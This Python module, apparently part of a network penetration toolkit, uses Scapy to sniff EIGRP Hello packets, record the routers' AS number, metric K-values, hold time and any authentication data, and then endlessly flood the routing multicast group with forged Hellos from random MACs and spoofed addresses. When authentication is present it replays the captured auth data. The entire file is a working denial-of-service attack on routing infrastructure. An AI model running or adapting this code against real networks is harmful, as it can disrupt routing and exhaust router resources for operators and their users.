import time
from scapy.all import *
from scapy.contrib.eigrp import EIGRP, EIGRPParam, EIGRPSwVer, EIGRPAuthData
from colorama import *


def eigrp_hello_flooding(interface):
    try:
        print(Fore.YELLOW + f"    [!] Detecting EIGRP routers...")  # Переведено
        global  total, router_count, eigrp_hello_captured
        eigrp_hello_captured = False  # Не захвачен
        eigrp_routers = {}
        total = 0
        router_count = 1
        def analyze_packet(packet):
            global target_mac, target_ip, autonomous_system, k1, k2, k3, k4, k5, hold_time, total, router_count, eigrp_hello_captured, auth, auth_type, auth_data, key_id
            if packet.haslayer(EIGRP) and packet[EIGRP].opcode == 5:
                if packet.haslayer(EIGRPAuthData):
                    auth = True
                    auth_type = packet[EIGRPAuthData].authtype
                    auth_data = packet[EIGRPAuthData].authdata
                    key_id = packet[EIGRPAuthData].keyid
                    if auth_type == 2:
                        output_auth = "MD5"
                    elif auth_type == 3:
                        output_auth = "SHA2-256"
                else:
                    auth = False
                    output_auth = "None"

                eigrp_hello_captured = True
                src_mac = packet[Ether].src
                src_ip = packet[IP].src
                asn = packet[EIGRP].asn
                target_ip = packet[IP].src
                autonomous_system = packet[EIGRP].asn
                k1 = packet[EIGRPParam].k1
                k2 = packet[EIGRPParam].k2
                k3 = packet[EIGRPParam].k3
                k4 = packet[EIGRPParam].k4
                k5 = packet[EIGRPParam].k5
                hold_time = packet[EIGRPParam].holdtime

                if src_mac in [router["MAC"] for router in eigrp_routers.values()]:
                    pass
                else:
                    eigrp_routers[f"Router{router_count}"] = {"MAC": src_mac, "IP": src_ip, "AS": asn}
                    router_count += 1
                    print(Fore.GREEN + f"\n    [+] [EIGRP Router detected]\n         MAC: {src_mac.upper()}\n         IP: {src_ip}\n"
                                       f"         AS: {asn}\n         Hold Time: {hold_time}\n         Authentication: {output_auth}")  # Переведено


        sniffer = AsyncSniffer(filter="ip proto 88", iface=interface, prn=analyze_packet, timeout=20)
        sniffer.start()
        time.sleep(21)

        if eigrp_hello_captured == True:  # Если EIGRP Hello захвачен
            global target_mac, target_ip, autonomous_system, k1, k2, k3, k4, k5, hold_time
            if auth == False:  # Если аутентификации нет
                print(Fore.GREEN + f"\n    [+] Attack is running... (Press Ctrl + C to Stop)")  # Переведено

                try:
                    while True:
                        src_ip = target_ip.split('.')
                        src_ip = src_ip[0] + "." + src_ip[1] + "." + src_ip[2] + "." + str(random.randint(0, 255))
                        src_mac = RandMAC()

                        fake_hello_packet = Ether(src=src_mac, dst="01:00:5e:00:00:0a") / \
                                            IP(src=src_ip, dst="224.0.0.10", ttl=1) / \
                                            EIGRP(opcode=5, asn=autonomous_system) / \
                                            EIGRPParam(holdtime=hold_time, k1=k1, k2=k2, k3=k3, k4=k4, k5=k5) / \
                                            EIGRPSwVer()
                        sendp(fake_hello_packet, iface=interface, count=1, verbose=False)
                        total += 1
                        print(Fore.GREEN + f"    [+] EIGRP Hellos sent: {total}", end="\r")  # Переведено

                except KeyboardInterrupt:
                    print(Fore.YELLOW + f"\n\n    [!] Attack stopped (User pressed Ctrl + C)")  # Переведено

            if auth == True:  # Если аутентификация есть
                print(Fore.GREEN + f"\n    [+] Attack is running... (Press Ctrl + C to Stop)")  # Переведено

                try:
                    while True:
                        src_ip = target_ip.split('.')
                        src_ip = src_ip[0] + "." + src_ip[1] + "." + src_ip[2] + "." + str(random.randint(0, 255))
                        src_mac = RandMAC()

                        fake_hello_packet = Ether(src=src_mac, dst="01:00:5e:00:00:0a") / \
                                            IP(src=src_ip, dst="224.0.0.10", ttl=1) / \
                                            EIGRP(opcode=5, asn=autonomous_system) / \
                                            EIGRPAuthData(authtype=auth_type, authdata=auth_data, keyid=key_id) /\
                                            EIGRPParam(holdtime=hold_time, k1=k1, k2=k2, k3=k3, k4=k4, k5=k5) / \
                                            EIGRPSwVer()
                        sendp(fake_hello_packet, iface=interface, count=1, verbose=False)
                        total += 1
                        print(Fore.GREEN + f"    [+] EIGRP Hellos sent: {total}", end="\r")  # Переведено

                except KeyboardInterrupt:
                    print(Fore.YELLOW + f"\n\n    [!] Attack stopped (User pressed Ctrl + C)")  # Переведено

        else:
            print(Fore.RED + f"    [-] %ERROR: No EIGRP routers detected (attack aborted)")  # Переведено

    except KeyboardInterrupt:
        print(Fore.YELLOW + f"\n    [!] Attack stopped (User pressed Ctrl + C)")  # Переведено